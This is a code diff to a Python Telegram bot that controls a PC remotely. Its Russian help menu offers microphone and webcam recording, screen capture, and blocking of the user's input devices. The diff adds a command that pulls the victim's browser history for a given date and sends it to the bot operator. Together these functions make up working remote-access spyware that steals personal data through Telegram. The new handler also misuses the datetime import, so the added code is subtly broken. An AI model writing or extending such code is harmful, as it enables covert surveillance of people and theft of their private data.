@@ -1,4 +1,6 @@
 import os
+from datetime import datetime
+
 import pyautogui
 import speech_recognition as sr
 import pyscreenshot
@@ -54,6 +56,7 @@ async def command_start(message=types.Message):
                            '/audmic "время в секундах" - запись звука с микрофона на протяжении указанного времени\n'
                            '/webvid "время в секундах" - запись видео с веб-камеры на протяжении указанного времени\n'
                            '/deskvid "время в секундах" - запись видео с рабочего стола на протяжении указанного времени\n'
+                           '/history "дата в формате 01-01-2022" - история с веб-браузеров в указанную дату\n'
                            '\n'
                            '~ Скриншот - получить скриншот.\n'
                            '~ Фото с веб-камеры - получить изображение вебкамеры.\n'
@@ -64,8 +67,16 @@ async def command_start(message=types.Message):
                            '~ Блок ввода - запрещает юзеру ПК пользоваться устройствами ввода\n'
                            '~ Анблок ввода - отменяет команду "Блок ввода"\n'
                            '~ Выключить экран - Выключить экран\n'
-                           '~ Включить экран - Включить экран (странно работает(не работает))',
+                           '~ Включить экран - Включить экран (странно работает(не работает))'
+                           ,
                            reply_markup=commands_kb)
+
+
+@dp.message_handler(commands=['history'])
+async def get_history(msg: types.Message):
+    commands = msg.text.split()
+    date = commands[1] if len(commands) > 1 else str(datetime.date.today())
+    await send_message(bot, msg.from_user.id, rm.get_history(date))
 
 
 @dp.message_handler(commands=['download'])
@@ -163,13 +174,13 @@ async def mouse_left_click(msg: types.Message):
 
 
 @dp.message_handler(text='Блок ввода')
-async def blockinput(msg: types.Message):
-    rm.blockinput()
+async def block_input(msg: types.Message):
+    await msg.answer(rm.blockinput())
 
 
 @dp.message_handler(text='Анблок ввода')
-async def blockinput_stop(msg: types.Message):
-    rm.blockinput_stop()
+async def unblock_input(msg: types.Message):
+    await msg.answer(rm.blockinput_stop())
 
 
 @dp.message_handler(text='Выключить экран')
@@ -178,8 +189,8 @@ async def turnoff_screen(message: types.Message):
 
 
 @dp.message_handler(text='Включить экран')
-async def turnoff_screen(message: types.Message):
-    rm.turn_on_screen()
+async def turnon_screen(message: types.Message):
+    pyautogui.click()
 
 
 @dp.message_handler(commands='v')
